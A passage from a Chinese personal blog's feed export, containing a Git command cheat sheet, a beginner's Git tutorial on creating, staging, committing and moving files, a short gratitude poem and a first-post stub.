<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout -b [branch]</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个分支，指向指定commit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch [branch] [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个分支，与指定的远程分支建立追踪关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch --track [branch] [remote-branch]</div></pre></td></tr></table></figure>
</li>
<li><p>切换到指定分支，并更新工作区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout [branch-name]</div></pre></td></tr></table></figure>
</li>
<li><p>切换到上一个分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout -</div></pre></td></tr></table></figure>
</li>
<li><p>建立追踪关系，在现有分支与指定的远程分支之间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch --set-upstream [branch] [remote-branch]</div></pre></td></tr></table></figure>
</li>
<li><p>合并指定分支到当前分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git merge [branch]</div></pre></td></tr></table></figure>
</li>
<li><p>选择一个commit，合并进当前分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git cherry-pick [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>删除分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch -d [branch-name]</div></pre></td></tr></table></figure>
</li>
<li><p>删除远程分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git push origin --delete [branch-name]</div><div class="line">git branch -dr [remote/branch]</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h2><ul>
<li><p>列出所有tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git tag</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个tag在当前commit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git tag [tag]</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个tag在指定commit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git tag [tag] [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>删除本地tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git tag -d [tag]</div></pre></td></tr></table></figure>
</li>
<li><p>删除远程tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push origin :refs/tags/[tagName]</div></pre></td></tr></table></figure>
</li>
<li><p>查看tag信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git show [tag]</div></pre></td></tr></table></figure>
</li>
<li><p>提交指定tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push [remote] [tag]</div></pre></td></tr></table></figure>
</li>
<li><p>提交所有tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push [remote] --tags</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个分支，指向某个tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout -b [branch] [tag]</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h2><ul>
<li><p>显示有变更的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git status</div></pre></td></tr></table></figure>
</li>
<li><p>显示当前分支的版本历史</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log</div></pre></td></tr></table></figure>
</li>
<li><p>显示commit历史，以及每次commit发生变更的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log --stat</div></pre></td></tr></table></figure>
</li>
<li><p>搜索提交历史，根据关键词</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log -S [keyword]</div></pre></td></tr></table></figure>
</li>
<li><p>显示某个commit之后的所有变动，每个commit占据一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log [tag] HEAD --pretty=format:%s</div></pre></td></tr></table></figure>
</li>
<li><p>显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log [tag] HEAD --grep feature</div></pre></td></tr></table></figure>
</li>
<li><p>显示某个文件的版本历史，包括文件改名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git log --follow [file]</div><div class="line">git whatchanged [file]</div></pre></td></tr></table></figure>
</li>
<li><p>显示指定文件相关的每一次diff</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log -p [file]</div></pre></td></tr></table></figure>
</li>
<li><p>显示过去5次提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git log -5 --pretty --oneline</div></pre></td></tr></table></figure>
</li>
<li><p>显示所有提交过的用户，按提交次数排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git shortlog -sn</div></pre></td></tr></table></figure>
</li>
<li><p>显示指定文件是什么人在什么时间修改过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git blame [file]</div></pre></td></tr></table></figure>
</li>
<li><p>显示暂存区和工作区的差异</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff</div></pre></td></tr></table></figure>
</li>
<li><p>显示暂存区和上一个commit的差异</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff --cached [file]</div></pre></td></tr></table></figure>
</li>
<li><p>显示工作区与当前分支最新commit之间的差异</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff HEAD</div></pre></td></tr></table></figure>
</li>
<li><p>显示两次提交之间的差异</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff [first-branch]...[second-branch]</div></pre></td></tr></table></figure>
</li>
<li><p>显示今天你写了多少行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>显示某次提交的元数据和内容变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git show [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>显示某次提交发生变化的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git show --name-only [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>显示某次提交时，某个文件的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git show [commit]:[filename]</div></pre></td></tr></table></figure>
</li>
<li><p>显示当前分支的最近几次提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reflog</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h2><ul>
<li><p>下载远程仓库的所有变动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git fetch [remote]</div></pre></td></tr></table></figure>
</li>
<li><p>显示所有远程仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote -v</div></pre></td></tr></table></figure>
</li>
<li><p>显示某个远程仓库的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote show [remote]</div></pre></td></tr></table></figure>
</li>
<li><p>增加一个新的远程仓库，并命名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote add [shortname] [url]</div></pre></td></tr></table></figure>
</li>
<li><p>取回远程仓库的变化，并与本地分支合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git pull [remote] [branch]</div></pre></td></tr></table></figure>
</li>
<li><p>上传本地指定分支到远程仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push [remote] [branch]</div></pre></td></tr></table></figure>
</li>
<li><p>强行推送当前分支到远程仓库，即使有冲突</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push [remote] --force</div></pre></td></tr></table></figure>
</li>
<li><p>推送所有分支到远程仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git push [remote] --all</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h2><ul>
<li><p>恢复暂存区的指定文件到工作区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout [file]</div></pre></td></tr></table></figure>
</li>
<li><p>恢复某个commit的指定文件到暂存区和工作区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout [commit] [file]</div></pre></td></tr></table></figure>
</li>
<li><p>恢复暂存区的所有文件到工作区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout .</div></pre></td></tr></table></figure>
</li>
<li><p>重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset [file]</div></pre></td></tr></table></figure>
</li>
<li><p>重置暂存区与工作区，与上一次commit保持一致</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --hard</div></pre></td></tr></table></figure>
</li>
<li><p>重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --hard [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>重置当前HEAD为指定commit，但保持暂存区和工作区不变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git reset --keep [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个commit，用来撤销指定commit</p>
</li>
<li><p>后者的所有变化都将被前者抵消，并且应用到当前分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git revert [commit]</div></pre></td></tr></table></figure>
</li>
<li><p>暂时将未提交的变化移除，稍后再移入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git stash</div><div class="line">git stash pop</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h2><ul>
<li>生成一个可供发布的压缩包<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git archive</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;Git常用命令&quot;&gt;&lt;a href=&quot;#Git常用命令&quot; class=&quot;headerlink&quot; title=&quot;Git常用命令&quot;&gt;&lt;/a&gt;Git常用命令&lt;/h1&gt;&lt;p&gt;Git 命令行操作工作流程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="git" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/git/"/>
    
    
      <category term="git" scheme="http://blog.unixmen.cn/tags/git/"/>
    
      <category term="git command" scheme="http://blog.unixmen.cn/tags/git-command/"/>
    
      <category term="git 命令行" scheme="http://blog.unixmen.cn/tags/git-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Git 基础操作</title>
    <link href="http://blog.unixmen.cn/2017/02/18/Git-%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
    <id>http://blog.unixmen.cn/2017/02/18/Git-基础操作/</id>
    <published>2017-02-17T16:59:59.000Z</published>
    <updated>2017-05-02T09:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git-是什么"><a href="#Git-是什么" class="headerlink" title="Git 是什么"></a>Git 是什么</h2><ul>
<li>是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</li>
<li>是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</li>
<li>与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</li>
</ul>
<h2 id="Git-与-SVN-区别"><a href="#Git-与-SVN-区别" class="headerlink" title="Git 与 SVN 区别"></a>Git 与 SVN 区别</h2><p>GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。<br>如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。</p>
<h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><ul>
<li>GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。</li>
<li>GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。</li>
<li>GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。</li>
<li>GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。</li>
<li>GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</li>
</ul>
<h2 id="快速入门："><a href="#快速入门：" class="headerlink" title="快速入门："></a>快速入门：</h2><h4 id="如何安装："><a href="#如何安装：" class="headerlink" title="如何安装："></a>如何安装：</h4><p><a href="https://git-for-windows.github.io/" target="_blank" rel="external">Windows Git 安装包下载</a></p>
<p><a href="https://git-scm.com/download/mac" target="_blank" rel="external">Mac Git 安装包下载</a></p>
<p><a href="https://git-scm.com/download/linux" target="_blank" rel="external">Linux 安装教程</a></p>
<h4 id="创建新仓库"><a href="#创建新仓库" class="headerlink" title="创建新仓库"></a>创建新仓库</h4><p>创建新的 git 仓库：</p>
<ul>
<li>创建新文件夹</li>
<li>进入新文件夹</li>
<li>命令行执行”git init”</li>
</ul>
<p>实例：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_init.png" alt=""></p>
<p>以上操作将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。点击<a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-%E5%BA%95%E5%B1%82%E5%91%BD%E4%BB%A4%E5%92%8C%E9%AB%98%E5%B1%82%E5%91%BD%E4%BB%A4#_git_internals" target="_blank" rel="external">链接</a>获取更多关于.git文件夹中包含了文件的信息。</p>
<p>如果你是在一个<strong>非空文件夹</strong>中初始化，需要：</p>
<ul>
<li>添加跟踪（git add）</li>
<li>提交（git commit）</li>
</ul>
<p>实例：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_add_init.png" alt=""></p>
<h4 id="获取Git仓库"><a href="#获取Git仓库" class="headerlink" title="获取Git仓库"></a>获取Git仓库</h4><p>执行如下命令以创建一个本地仓库的克隆版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/netb2c/netb2c.github.io.git</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_clone.png" alt=""></p>
<p>如果是远端服务器上的仓库,可使用SSH传输协议:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@10.160.0.200:/data/sdk_svnserver/netb2c.git</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_clone_1.png" alt=""></p>
<h4 id="检查当前文件状态"><a href="#检查当前文件状态" class="headerlink" title="检查当前文件状态"></a>检查当前文件状态</h4><p>要查看哪些文件处于什么状态，可以用 git status 命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git status</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_status.png" alt=""></p>
<p>以上反馈信息显示：</p>
<ul>
<li>当前所在工作目录相当干净</li>
<li>所有已跟踪文件在上次提交后都未被更改过</li>
<li>当前目录下没有出现任何处于未跟踪状态的新文件</li>
<li>显示了当前所在分支(“master”)</li>
</ul>
<h4 id="添加、修改文件测试："><a href="#添加、修改文件测试：" class="headerlink" title="添加、修改文件测试："></a>添加、修改文件测试：</h4><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_status_1.png" alt=""></p>
<p>以上打印信息可以看到：</p>
<ul>
<li><p>daily_task.md 文件在Changes not staged for commit下面：<br>– 文件内容发生便会<br>– 未在暂存区<br>需要保存到暂存区，需要执行”git add” 暂存修改</p>
</li>
<li><p>新建的 README.md 文件现在 Untracked files 下面：<br>– 新文件未被跟踪<br>– 新闻界需要添加跟踪</p>
</li>
</ul>
<h4 id="跟踪新文件"><a href="#跟踪新文件" class="headerlink" title="跟踪新文件"></a>跟踪新文件</h4><p>使用命令 git add 开始跟踪一个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git add</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_add.png" alt=""></p>
<p>正常情况下不会打印信息。</p>
<p>再次查看状态：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_status_2.png" alt=""></p>
<ul>
<li>两个文档都在Changes to be committed下:<h2 id="–-此时已暂时保存当前文档状态"><a href="#–-此时已暂时保存当前文档状态" class="headerlink" title="– 此时已暂时保存当前文档状态"></a>– 此时已暂时保存当前文档状态</h2>注：git add 只是将增加、修改后文件添加内容到下一次提交中”而不是“将文件直接添加到项目中”</li>
</ul>
<h4 id="简略状态信息查看"><a href="#简略状态信息查看" class="headerlink" title="简略状态信息查看"></a>简略状态信息查看</h4><p>git status 命令的输出十分详细，但其用语有些繁琐。<br>如果你使用 git status -s 命令或 git status –short 命令，你将得到一种更为紧凑的格式输出，如图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_status_4.png" alt=""></p>
<ul>
<li>A：新增</li>
<li>M：修改</li>
<li>??：未被跟踪</li>
</ul>
<h4 id="查看已暂存和未暂存的修改"><a href="#查看已暂存和未暂存的修改" class="headerlink" title="查看已暂存和未暂存的修改"></a>查看已暂存和未暂存的修改</h4><p>git status 命令的输出对于你来说过于模糊，你想知道具体修改了什么地方，可以用 git diff 命令。</p>
<ul>
<li><p>要查看<strong>尚未暂存</strong>的文件更新了哪些部分，不加参数直接输入 git diff<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_diff.png" alt=""></p>
</li>
<li><p>若要查看<strong>已暂存的将要添加到下次提交里</strong>的内容，需用  git diff –staged<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_diff_1.png" alt=""></p>
</li>
</ul>
<h4 id="提交更新"><a href="#提交更新" class="headerlink" title="提交更新"></a>提交更新</h4><p>暂存区域已经准备妥当可以提交了。<br>一定要确认还有什么修改过的或新建的文件还没有 git add 过，否则提交的时候不会记录这些还没暂存起来的变化。 这些修改过的文件只保留在本地磁盘。 所以，每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_commit.png" alt=""></p>
<h5 id="跳过使用暂存区域"><a href="#跳过使用暂存区域" class="headerlink" title="跳过使用暂存区域"></a>跳过使用暂存区域</h5><p> Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤，详见下图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_commit_1.png" alt=""></p>
<h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><p>要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 git rm 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_commit_2.png" alt=""></p>
<p>正确的删除版本控制库文件需要：</p>
<ul>
<li>删除本地文件： rm file</li>
<li>从版本控制库中删除： git rm file</li>
<li>提交更新： git commit -m “Commit message.”</li>
</ul>
<h4 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h4><p>Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。<br>需要使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git mv old_name new_name</div></pre></td></tr></table></figure></p>
<p>实例：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/git_rename.png" alt=""></p>
<p>其实，运行 git mv 就相当于运行了下面三条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mv README.md README</div><div class="line">git rm README.md</div><div class="line">git add README</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Git-是什么&quot;&gt;&lt;a href=&quot;#Git-是什么&quot; class=&quot;headerlink&quot; title=&quot;Git 是什么&quot;&gt;&lt;/a&gt;Git 是什么&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。&lt;/li&gt;
&lt;li
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="git" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/git/"/>
    
    
      <category term="git" scheme="http://blog.unixmen.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>感恩</title>
    <link href="http://blog.unixmen.cn/2017/02/17/%E6%84%9F%E6%81%A9/"/>
    <id>http://blog.unixmen.cn/2017/02/17/感恩/</id>
    <published>2017-02-17T03:06:56.000Z</published>
    <updated>2017-02-17T06:09:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="感恩"><a href="#感恩" class="headerlink" title="感恩"></a>感恩</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[感恩]是快乐的来源，</div><div class="line">感恩天地，生命之源</div><div class="line">感恩阳光，托起梦想</div><div class="line">感恩万物，助我成长</div><div class="line">感恩父母，赐予生命</div><div class="line">感恩兄弟，手足情深</div><div class="line">感恩某人，冤家聚首</div><div class="line">感恩孩子，舐犊情深</div><div class="line">感恩恩师，淳淳教诲</div><div class="line">感恩朋友，知心之谊</div><div class="line">感恩同袍，携手同行</div><div class="line">感恩领导，不吝提携</div><div class="line">感恩公司，给我平台</div><div class="line">感恩挫折，让我成长</div><div class="line">感恩命运，让我懂得</div><div class="line">感恩黑暗，让我领悟</div><div class="line">感恩科技，建立博客</div><div class="line">感恩，感恩，感恩....</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;感恩&quot;&gt;&lt;a href=&quot;#感恩&quot; class=&quot;headerlink&quot; title=&quot;感恩&quot;&gt;&lt;/a&gt;感恩&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div c
    
    </summary>
    
      <category term="生活" scheme="http://blog.unixmen.cn/categories/Life/"/>
    
    
      <category term="感恩" scheme="http://blog.unixmen.cn/tags/%E6%84%9F%E6%81%A9/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博客</title>
    <link href="http://blog.unixmen.cn/2017/02/17/first/"/>
    <id>http://blog.unixmen.cn/2017/02/17/first/</id>
    <published>2017-02-17T03:03:39.000Z</published>
    <updated>2017-02-17T06:10:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>就这么开始吧，精彩内容敬请期待…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;就这么开始吧，精彩内容敬请期待…&lt;/p&gt;

    
    </summary>
    
      <category term="生活" scheme="http://blog.unixmen.cn/categories/Life/"/>
    
    
      <category term="开篇" scheme="http://blog.unixmen.cn/tags/%E5%BC%80%E7%AF%87/"/>
    
  </entry>
  
</feed>
